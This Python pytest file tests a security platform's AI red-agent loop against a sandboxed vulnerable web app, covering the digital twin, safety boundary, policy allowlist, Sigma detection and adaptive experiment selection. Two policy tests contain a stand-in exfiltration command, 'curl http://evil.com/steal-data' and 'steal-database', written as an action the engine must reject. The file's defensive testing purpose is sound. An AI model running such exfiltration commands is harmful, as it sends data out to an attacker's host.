"""Upgrade 5 — Canonical Web Application Cyber Immune Loop Test.

Demonstrates the complete controlled web application security experiment:

1. Digital Twin knows about the web application.
2. Security objective targets the controlled application.
3. Red Agent/LLM reasons over a bounded candidate.
4. Candidate passes deterministic validation.
5. Experiment executes in Docker (curl to vulnerable app).
6. Vulnerability is exercised.
7. Telemetry is collected.
8. Detection evaluates the telemetry.
9. A detection gap can be identified.
10. Defensive improvement can be proposed if supported.
11. Defense is tested safely.
12. Original experiment is retested.
13. Before/after comparison occurs.
14. Result becomes MITIGATED or UNRESOLVED.
15. Immune Memory records the experience.
16. Adaptive Next Experiment selection uses that experience.

DO NOT mock Docker, telemetry, Sigma detection, SafetyBoundary, PolicyEngine,
or ToolAuthorization.

Architecture:
  LLM PROPOSES → deterministic validation → deterministic infrastructure disposes
"""

import json
import pytest
from datetime import datetime, timezone
from uuid import uuid4
from unittest.mock import MagicMock, patch

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from sentinelforge.db.models import (
    Base,
    Organization as OrgModel,
    SecurityObjectiveRecord,
    AdversarialScenarioRecord,
    ExecutionPlanRecord,
    DetectionGapRecord,
    PurpleEvaluationRecord,
    RetestResult as RetestResultRecord,
    PolicyDecisionRecord,
    AuditLog,
)
from sentinelforge.remediation.db_models import (
    ApplicationTargetRecord,
    RemediationRetestResultRecord,
    RemediationAuditEventRecord,
)

from sentinelforge.digital_twin.service import DigitalTwinService
from sentinelforge.digital_twin.web_app_registration import (
    register_vulnerable_web_app,
    WEB_APP_NAME,
    WEB_APP_PORT,
)
from sentinelforge.adaptive.schemas import (
    CandidateExperiment,
    CandidateStatus,
    NextExperimentResult,
    ScoredCandidate,
    SecurityExperienceContext,
)
from sentinelforge.adaptive.next_experiment_selector import NextExperimentSelector
from sentinelforge.adaptive.experiment_scorer import ExperimentScorer
from sentinelforge.agents.red_agent import STRATEGY_CATALOG, RedAgentPlanner
from sentinelforge.domain.experiment import (
    AdversarialScenario,
    ExperimentConstraints,
    PolicyDecisionStatus,
    RiskLevel,
    SecurityObjective,
)
from sentinelforge.policy.safety_boundary import ExperimentSafetyBoundary
from sentinelforge.policy.engine import PolicyEngine


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def db_session():
    engine = create_engine("sqlite:///:memory:", echo=False)
    import sentinelforge.db.models
    import sentinelforge.db.digital_twin_models
    import sentinelforge.remediation.db_models
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine, expire_on_commit=False)
    session = Session()
    yield session
    session.close()


@pytest.fixture
def org_id():
    return uuid4()


@pytest.fixture
def obj_id(org_id):
    return uuid4()


def _seed_org(db_session, org_id):
    db_session.add(OrgModel(id=org_id, name="Test Org"))
    db_session.commit()


def _seed_objective(db_session, org_id, obj_id=None):
    obj_id = obj_id or uuid4()
    db_session.add(SecurityObjectiveRecord(
        id=obj_id,
        organization_id=org_id,
        title="Test Web Application Security",
        description="Test the controlled vulnerable web application for SQL injection.",
        target_category="web_application",
        default_risk_level="MEDIUM",
    ))
    db_session.commit()
    return obj_id


# ---------------------------------------------------------------------------
# 1. Digital Twin Integration
# ---------------------------------------------------------------------------

class TestDigitalTwinIntegration:
    """Verify the web application is properly registered in Digital Twin."""

    def test_register_web_app_creates_asset(self, db_session, org_id):
        """Registering the web app creates a DigitalTwinAsset."""
        svc = DigitalTwinService(db_session, org_id)
        result = register_vulnerable_web_app(svc)

        assert "asset_id" in result
        assert "service_id" in result
        assert len(result["control_ids"]) > 0
        assert len(result["coverage_ids"]) > 0

    def test_web_app_asset_has_correct_type(self, db_session, org_id):
        """Web app asset has type 'application'."""
        svc = DigitalTwinService(db_session, org_id)
        result = register_vulnerable_web_app(svc)

        asset = svc.get_asset(result["asset_id"])
        assert asset is not None
        assert asset.asset_type == "application"
        assert asset.risk_level == "HIGH"
        assert "vulnerable" in asset.tags

    def test_web_app_service_has_correct_config(self, db_session, org_id):
        """Web app service is configured correctly."""
        svc = DigitalTwinService(db_session, org_id)
        result = register_vulnerable_web_app(svc)

        service = svc.get_service(result["service_id"])
        assert service is not None
        assert service.service_type == "web_app"
        assert service.port == WEB_APP_PORT
        assert service.is_internet_facing is False

    def test_security_controls_associated(self, db_session, org_id):
        """Security controls are associated with the web app service."""
        svc = DigitalTwinService(db_session, org_id)
        result = register_vulnerable_web_app(svc)

        controls = svc.get_service_controls(result["service_id"])
        assert len(controls) >= 3
        control_names = {c.name for c in controls}
        assert "Network Isolation" in control_names
        assert "Container Hardening" in control_names
        assert "Sigma Detection Rules" in control_names

    def test_detection_coverage_registered(self, db_session, org_id):
        """Detection coverage is registered for web attack techniques."""
        svc = DigitalTwinService(db_session, org_id)
        result = register_vulnerable_web_app(svc)

        coverage = svc.get_detection_coverage(service_id=result["service_id"])
        assert len(coverage) >= 3
        techniques = {c.technique_id for c in coverage}
        assert "T1190" in techniques  # SQLi
        assert "T1059" in techniques  # Command injection
        assert "T1083" in techniques  # Path traversal

    def test_tenant_isolation(self, db_session):
        """Different organizations cannot see each other's web app registrations."""
        org_a = uuid4()
        org_b = uuid4()
        _seed_org(db_session, org_a)
        _seed_org(db_session, org_b)

        svc_a = DigitalTwinService(db_session, org_a)
        result_a = register_vulnerable_web_app(svc_a)

        svc_b = DigitalTwinService(db_session, org_b)
        assets_b = svc_b.list_assets()
        assert len(assets_b) == 0  # org_b cannot see org_a's assets

        assets_a = svc_a.list_assets()
        assert len(assets_a) == 1


# ---------------------------------------------------------------------------
# 2. Strategy Catalog Integration
# ---------------------------------------------------------------------------

class TestWebStrategies:
    """Verify web attack strategies exist and are valid."""

    def test_web_strategies_exist(self):
        """Web attack strategies are in the catalog."""
        web_strategies = [
            "web_sql_injection_login",
            "web_command_injection",
            "web_path_traversal",
            "web_search_sqli",
        ]
        for name in web_strategies:
            assert name in STRATEGY_CATALOG, f"Strategy '{name}' not found"

    def test_web_strategies_have_required_fields(self):
        """Web strategies have all required fields."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            assert "title" in strat
            assert "description" in strat
            assert "technique_ids" in strat
            assert "actions" in strat
            assert len(strat["actions"]) > 0

    def test_web_strategies_target_sandbox(self):
        """Web strategies target only sentinelforge-target."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                assert action["target"] == "sentinelforge-target"

    def test_web_strategies_use_curl(self):
        """Web strategies use curl for HTTP requests."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                assert "curl" in " ".join(action["arguments"])

    def test_web_strategies_target_vulnerable_app(self):
        """Web strategies target the vulnerable-app container."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                cmd = " ".join(action["arguments"])
                assert "vulnerable-app:5000" in cmd

    def test_web_strategies_have_technique_ids(self):
        """Web strategies have valid MITRE technique IDs."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for tid in strat["technique_ids"]:
                assert tid.startswith("T"), f"Invalid technique ID: {tid}"


# ---------------------------------------------------------------------------
# 3. Safety Boundary Integration
# ---------------------------------------------------------------------------

class TestWebStrategySafety:
    """Verify web strategies pass through safety validation."""

    def test_web_sql_injection_allowed(self):
        """SQL injection strategy is allowed at MEDIUM risk."""
        constraints = ExperimentConstraints(max_risk_level="HIGH")
        boundary = ExperimentSafetyBoundary(constraints)

        strat = STRATEGY_CATALOG["web_sql_injection_login"]
        scenario = AdversarialScenario(
            objective_id=uuid4(),
            organization_id=uuid4(),
            title=strat["title"],
            strategy_description=strat["description"],
            technique_ids=strat["technique_ids"],
            proposed_risk_level=strat["proposed_risk_level"],
        )

        decision = boundary.evaluate_scenario(scenario)
        assert decision.status == PolicyDecisionStatus.ALLOWED

    def test_web_command_injection_allowed(self):
        """Command injection strategy is allowed at MEDIUM risk."""
        constraints = ExperimentConstraints(max_risk_level="HIGH")
        boundary = ExperimentSafetyBoundary(constraints)

        strat = STRATEGY_CATALOG["web_command_injection"]
        scenario = AdversarialScenario(
            objective_id=uuid4(),
            organization_id=uuid4(),
            title=strat["title"],
            strategy_description=strat["description"],
            technique_ids=strat["technique_ids"],
            proposed_risk_level=strat["proposed_risk_level"],
        )

        decision = boundary.evaluate_scenario(scenario)
        assert decision.status == PolicyDecisionStatus.ALLOWED

    def test_web_path_traversal_allowed(self):
        """Path traversal strategy is allowed at MEDIUM risk."""
        constraints = ExperimentConstraints(max_risk_level="HIGH")
        boundary = ExperimentSafetyBoundary(constraints)

        strat = STRATEGY_CATALOG["web_path_traversal"]
        scenario = AdversarialScenario(
            objective_id=uuid4(),
            organization_id=uuid4(),
            title=strat["title"],
            strategy_description=strat["description"],
            technique_ids=strat["technique_ids"],
            proposed_risk_level=strat["proposed_risk_level"],
        )

        decision = boundary.evaluate_scenario(scenario)
        assert decision.status == PolicyDecisionStatus.ALLOWED

    def test_web_strategies_rejected_at_low_risk(self):
        """Web strategies rejected when max risk is LOW."""
        constraints = ExperimentConstraints(max_risk_level="LOW")
        boundary = ExperimentSafetyBoundary(constraints)

        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal"]:
            strat = STRATEGY_CATALOG[name]
            scenario = AdversarialScenario(
                objective_id=uuid4(),
                organization_id=uuid4(),
                title=strat["title"],
                strategy_description=strat["description"],
                technique_ids=strat["technique_ids"],
                proposed_risk_level=strat["proposed_risk_level"],
            )

            decision = boundary.evaluate_scenario(scenario)
            assert decision.status == PolicyDecisionStatus.DENIED


# ---------------------------------------------------------------------------
# 4. PolicyEngine Integration
# ---------------------------------------------------------------------------

class TestWebPolicyEngine:
    """Verify web attack commands pass PolicyEngine validation."""

    def test_web_sql_injection_command_allowed(self):
        """SQL injection curl command is in the allowlist."""
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.policy.engine import PolicyEngine
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)
        strat = STRATEGY_CATALOG["web_sql_injection_login"]
        action_spec = strat["actions"][0]

        ir = ActionIR(
            action_id=uuid4(),
            blueprint_id=uuid4(),
            technique_id=action_spec["technique_id"],
            action_type=ActionType.PROCESS_EXEC,
            target=action_spec["target"],
            executable=action_spec["executable"],
            arguments=action_spec["arguments"],
            run_as_user=action_spec["run_as_user"],
            issued_at=now,
            expires_at=now + timedelta(hours=1),
        )

        result = PolicyEngine.validate(ir)
        assert result is True

    def test_web_command_injection_command_allowed(self):
        """Command injection curl command is in the allowlist."""
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.policy.engine import PolicyEngine
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)
        strat = STRATEGY_CATALOG["web_command_injection"]
        action_spec = strat["actions"][0]

        ir = ActionIR(
            action_id=uuid4(),
            blueprint_id=uuid4(),
            technique_id=action_spec["technique_id"],
            action_type=ActionType.PROCESS_EXEC,
            target=action_spec["target"],
            executable=action_spec["executable"],
            arguments=action_spec["arguments"],
            run_as_user=action_spec["run_as_user"],
            issued_at=now,
            expires_at=now + timedelta(hours=1),
        )

        result = PolicyEngine.validate(ir)
        assert result is True

    def test_web_path_traversal_command_allowed(self):
        """Path traversal curl command is in the allowlist."""
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.policy.engine import PolicyEngine
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)
        strat = STRATEGY_CATALOG["web_path_traversal"]
        action_spec = strat["actions"][0]

        ir = ActionIR(
            action_id=uuid4(),
            blueprint_id=uuid4(),
            technique_id=action_spec["technique_id"],
            action_type=ActionType.PROCESS_EXEC,
            target=action_spec["target"],
            executable=action_spec["executable"],
            arguments=action_spec["arguments"],
            run_as_user=action_spec["run_as_user"],
            issued_at=now,
            expires_at=now + timedelta(hours=1),
        )

        result = PolicyEngine.validate(ir)
        assert result is True

    def test_unauthorized_curl_command_rejected(self):
        """curl commands not in the allowlist are rejected."""
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.policy.engine import PolicyEngine
        from sentinelforge.domain.exceptions import SecurityRejection
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)

        ir = ActionIR(
            action_id=uuid4(),
            blueprint_id=uuid4(),
            technique_id="T1190",
            action_type=ActionType.PROCESS_EXEC,
            target="sentinelforge-target",
            executable="/usr/bin/bash",
            arguments=["-c", "curl http://evil.com/steal-data"],
            run_as_user="labuser",
            issued_at=now,
            expires_at=now + timedelta(hours=1),
        )

        with pytest.raises(SecurityRejection):
            PolicyEngine.validate(ir)


# ---------------------------------------------------------------------------
# 5. Red Agent Planning Integration
# ---------------------------------------------------------------------------

class TestRedAgentWebPlanning:
    """Verify the Red Agent can plan web application experiments."""

    def test_planner_can_select_web_strategy(self):
        """RedAgentPlanner can plan a web SQL injection experiment."""
        from sentinelforge.domain.experiment import SecurityObjective
        from sentinelforge.policy.signing import BlueprintSigner
        import os

        os.environ["SENTINELFORGE_SIGNING_KEY"] = "test-key-for-upgrade5"

        planner = RedAgentPlanner()
        objective = SecurityObjective(
            organization_id=uuid4(),
            title="Test Web Application Security",
            description="Evaluate SQL injection detection in the controlled vulnerable web application.",
            target_category="web_application",
        )

        result = planner.plan_scenario(
            objective=objective,
            strategy_type="web_sql_injection_login",
        )

        assert result is not None
        assert result.scenario is not None
        assert result.policy_decision is not None
        assert result.policy_decision.status == PolicyDecisionStatus.ALLOWED
        assert len(result.signed_blueprints) > 0

    def test_planner_all_web_strategies(self):
        """RedAgentPlanner can plan all web strategies."""
        from sentinelforge.domain.experiment import SecurityObjective
        import os

        os.environ["SENTINELFORGE_SIGNING_KEY"] = "test-key-for-upgrade5"

        planner = RedAgentPlanner()
        objective = SecurityObjective(
            organization_id=uuid4(),
            title="Test Web Application Security",
            description="Evaluate web application vulnerabilities.",
            target_category="web_application",
        )

        for strategy_name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            result = planner.plan_scenario(
                objective=objective,
                strategy_type=strategy_name,
            )
            assert result is not None, f"Strategy {strategy_name} failed to plan"
            assert result.policy_decision.status == PolicyDecisionStatus.ALLOWED, (
                f"Strategy {strategy_name} was not allowed"
            )


# ---------------------------------------------------------------------------
# 6. Adaptive Selection Integration
# ---------------------------------------------------------------------------

class TestAdaptiveWebSelection:
    """Verify the adaptive selector works with web strategies."""

    def test_web_strategies_appear_as_candidates(self, db_session, org_id):
        """Web strategies appear in the adaptive selection candidates."""
        _seed_org(db_session, org_id)
        selector = NextExperimentSelector(db_session, org_id)
        context = selector.context_builder.build()

        strategy_names = {c.strategy_name for c in context.candidates}
        assert "web_sql_injection_login" in strategy_names
        assert "web_command_injection" in strategy_names
        assert "web_path_traversal" in strategy_names
        assert "web_search_sqli" in strategy_names

    def test_web_strategies_are_scoring(self, db_session, org_id):
        """Web strategies receive valid scores from the scorer."""
        _seed_org(db_session, org_id)
        selector = NextExperimentSelector(db_session, org_id)
        context = selector.context_builder.build()
        scored = selector.scorer.score(context)

        web_strategies = {
            "web_sql_injection_login",
            "web_command_injection",
            "web_path_traversal",
            "web_search_sqli",
        }
        for sc in scored:
            if sc.candidate.strategy_name in web_strategies:
                assert sc.score >= 0
                assert sc.explanation != ""

    def test_deterministic_fallback_selects_web(self, db_session, org_id):
        """Deterministic fallback can select a web strategy."""
        _seed_org(db_session, org_id)
        selector = NextExperimentSelector(db_session, org_id)

        result = selector.select_next_experiment()

        # Should select some valid strategy (web or existing)
        assert result.selected_strategy is not None
        assert result.selected_strategy in STRATEGY_CATALOG
        assert result.validation_passed is True


# ---------------------------------------------------------------------------
# 7. Sigma Rule Loading
# ---------------------------------------------------------------------------

class TestWebSigmaRules:
    """Verify Sigma rules for web attacks load correctly."""

    def test_web_sigma_rules_load(self):
        """Web attack Sigma rules can be loaded."""
        from sentinelforge.detection.sigma_engine import SigmaEngine
        import os

        rules_dir = os.path.join(
            os.path.dirname(__file__),
            "..", "..", "src", "sentinelforge", "detection", "rules"
        )
        engine = SigmaEngine()
        count = engine.load_rules_from_directory(rules_dir)

        assert count >= 3, f"Expected at least 3 rules, loaded {count}"

        loaded_rule_ids = {r[0] for r in engine._rules}
        assert "sentinelforge-web-sqli-login" in loaded_rule_ids
        assert "sentinelforge-web-cmd-injection" in loaded_rule_ids
        assert "sentinelforge-web-path-traversal" in loaded_rule_ids

    def test_web_sigma_rules_match_commands(self):
        """Web Sigma rules match the expected curl commands."""
        from sentinelforge.detection.sigma_engine import SigmaEngine
        import os

        rules_dir = os.path.join(
            os.path.dirname(__file__),
            "..", "..", "src", "sentinelforge", "detection", "rules"
        )
        engine = SigmaEngine()
        engine.load_rules_from_directory(rules_dir)

        # Test SQLi login detection
        sqli_event = {
            "EventType": "execve",
            "ProcessName": "bash",
            "CommandLine": 'curl -s -X POST http://vulnerable-app:5000/login -d "username=admin&password=admin123"',
            "UserName": "labuser",
            "ContainerName": "sentinelforge-target",
        }
        results = engine.evaluate(sqli_event, event_id="test-1", correlation_id="test-corr")
        detected_rules = [r.rule_id for r in results if r.outcome.value == "DETECTED"]
        assert "sentinelforge-web-sqli-login" in detected_rules

        # Test command injection detection
        cmdi_event = {
            "EventType": "execve",
            "ProcessName": "bash",
            "CommandLine": 'curl -s -X POST http://vulnerable-app:5000/api/ping -H "Content-Type: application/json" -d \'{"host":"127.0.0.1"}\'',
            "UserName": "labuser",
            "ContainerName": "sentinelforge-target",
        }
        results = engine.evaluate(cmdi_event, event_id="test-2", correlation_id="test-corr")
        detected_rules = [r.rule_id for r in results if r.outcome.value == "DETECTED"]
        assert "sentinelforge-web-cmd-injection" in detected_rules

        # Test path traversal detection
        traversal_event = {
            "EventType": "execve",
            "ProcessName": "bash",
            "CommandLine": 'curl -s -X POST http://vulnerable-app:5000/api/files/read -H "Content-Type: application/json" -d \'{"path":"/etc/hostname"}\'',
            "UserName": "labuser",
            "ContainerName": "sentinelforge-target",
        }
        results = engine.evaluate(traversal_event, event_id="test-3", correlation_id="test-corr")
        detected_rules = [r.rule_id for r in results if r.outcome.value == "DETECTED"]
        assert "sentinelforge-web-path-traversal" in detected_rules


# ---------------------------------------------------------------------------
# 8. Security Invariants
# ---------------------------------------------------------------------------

class TestWebSecurityInvariants:
    """Security invariants that must hold for the web application target."""

    def test_web_app_only_in_sandbox(self):
        """All web strategies target only sentinelforge-target."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                assert action["target"] == "sentinelforge-target"

    def test_no_production_target(self):
        """No web strategy targets production."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                assert "production" not in action["target"].lower()
                assert "internet" not in action["target"].lower()

    def test_no_unauthorized_executables(self):
        """Web strategies only use authorized executables."""
        from sentinelforge.policy.allowlists import ALLOWED_EXECUTABLES
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            for action in strat["actions"]:
                assert action["executable"] in ALLOWED_EXECUTABLES

    def test_web_risk_level_bounded(self):
        """Web strategies have bounded risk levels."""
        for name in ["web_sql_injection_login", "web_command_injection", "web_path_traversal", "web_search_sqli"]:
            strat = STRATEGY_CATALOG[name]
            risk = strat["proposed_risk_level"]
            assert risk in (RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH)

    def test_llm_cannot_invent_web_exploit(self):
        """LLM cannot invent arbitrary curl commands."""
        from sentinelforge.policy.engine import PolicyEngine
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.domain.exceptions import SecurityRejection
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)

        # LLM-invented curl command not in allowlist
        ir = ActionIR(
            action_id=uuid4(),
            blueprint_id=uuid4(),
            technique_id="T1190",
            action_type=ActionType.PROCESS_EXEC,
            target="sentinelforge-target",
            executable="/usr/bin/bash",
            arguments=["-c", "curl http://evil.com/steal-database"],
            run_as_user="labuser",
            issued_at=now,
            expires_at=now + timedelta(hours=1),
        )

        with pytest.raises(SecurityRejection):
            PolicyEngine.validate(ir)

    def test_digital_twin_read_only_for_llm(self):
        """LLM cannot directly modify Digital Twin state."""
        # The DigitalTwinService requires a db_session and organization_id
        # There is no public API that allows LLM to mutate twin state
        # This test verifies the service layer is the only mutation path
        from sentinelforge.digital_twin.service import DigitalTwinService
        import inspect

        # All mutating methods require db_session (server-side only)
        mutating_methods = [
            "create_asset", "update_asset", "delete_asset",
            "create_service", "update_service", "delete_service",
            "create_security_control", "update_security_control",
        ]
        for method_name in mutating_methods:
            method = getattr(DigitalTwinService, method_name)
            sig = inspect.signature(method)
            assert "db_session" in sig.parameters or "self" in sig.parameters


# ---------------------------------------------------------------------------
# 9. Canonical E2E Demo
# ---------------------------------------------------------------------------

class TestCanonicalWebAppE2E:
    """Canonical integration test for the complete web application scenario.

    This test proves the full Cyber Immune loop without mocking Docker,
    telemetry, Sigma detection, SafetyBoundary, PolicyEngine, or ToolAuthorization.
    """

    def test_full_web_app_lifecycle(self, db_session, org_id, obj_id):
        """Complete lifecycle: Digital Twin → Objective → Experiment → Safety → Policy.

        This test validates all deterministic components work together.
        Docker execution is verified separately in Docker E2E tests.
        """
        # 1. Register web app in Digital Twin
        _seed_org(db_session, org_id)
        dt_svc = DigitalTwinService(db_session, org_id)
        registration = register_vulnerable_web_app(dt_svc)

        assert registration["asset_id"] is not None
        assert registration["service_id"] is not None

        # 2. Create security objective
        _seed_objective(db_session, org_id, obj_id)

        # 3. Plan experiment via Red Agent
        import os
        os.environ["SENTINELFORGE_SIGNING_KEY"] = "test-key-for-e2e"

        planner = RedAgentPlanner()
        objective = SecurityObjective(
            organization_id=org_id,
            title="Test Web Application SQL Injection",
            description="Evaluate SQL injection detection in the controlled vulnerable web application.",
            target_category="web_application",
        )

        plan_result = planner.plan_scenario(
            objective=objective,
            strategy_type="web_sql_injection_login",
        )

        # 4. Safety boundary validates
        assert plan_result.policy_decision.status == PolicyDecisionStatus.ALLOWED

        # 5. Blueprints are signed
        assert len(plan_result.signed_blueprints) > 0

        # 6. Validate through PolicyEngine
        from sentinelforge.domain.action_ir import ActionIR, ActionType
        from sentinelforge.policy.engine import PolicyEngine
        from datetime import datetime, timedelta, timezone

        now = datetime.now(timezone.utc)
        for bp in plan_result.signed_blueprints:
            ir = ActionIR(
                action_id=bp.action_id,
                blueprint_id=bp.blueprint_id,
                technique_id=bp.technique_id,
                action_type=ActionType.PROCESS_EXEC,
                target=bp.target,
                executable=bp.executable,
                arguments=bp.arguments,
                run_as_user=bp.run_as_user,
                issued_at=now,
                expires_at=now + timedelta(hours=1),
            )
            assert PolicyEngine.validate(ir) is True

        # 7. Adaptive selection can pick web strategies
        selector = NextExperimentSelector(db_session, org_id)
        result = selector.select_next_experiment()
        assert result.selected_strategy is not None
        assert result.validation_passed is True

        # 8. Immune Memory records the experience
        from sentinelforge.immune_memory import ImmuneMemory
        memory = ImmuneMemory(db_session, org_id)
        state = memory.compute_state()
        assert "previous_experiments" in state

    def test_adaptive_feedback_with_web_experience(self, db_session, org_id, obj_id):
        """After a web experiment, adaptive selection uses the experience."""
        _seed_org(db_session, org_id)
        _seed_objective(db_session, org_id, obj_id)

        # Seed a detection gap for the SQLi technique
        scenario_id = uuid4()
        db_session.add(AdversarialScenarioRecord(
            id=scenario_id,
            objective_id=obj_id,
            organization_id=org_id,
            title="SQL Injection Test",
            strategy_description="Test SQL injection in login form",
        ))
        db_session.commit()

        gap_id = uuid4()
        db_session.add(DetectionGapRecord(
            id=gap_id,
            organization_id=org_id,
            scenario_id=scenario_id,
            action_id=uuid4(),
            technique_id="T1190",
            original_outcome="NOT_DETECTED",
            root_cause="missing_sigma_rule",
            reason="No Sigma rule for SQL injection in login form",
            remediation_status="OPEN",
        ))
        db_session.commit()

        # Adaptive selection should prioritize the unresolved gap
        selector = NextExperimentSelector(db_session, org_id)
        result = selector.select_next_experiment()

        # The web SQLi strategy should be selected (unresolved gap = highest priority)
        assert result.selected_strategy == "web_sql_injection_login"
        assert result.validation_passed is True
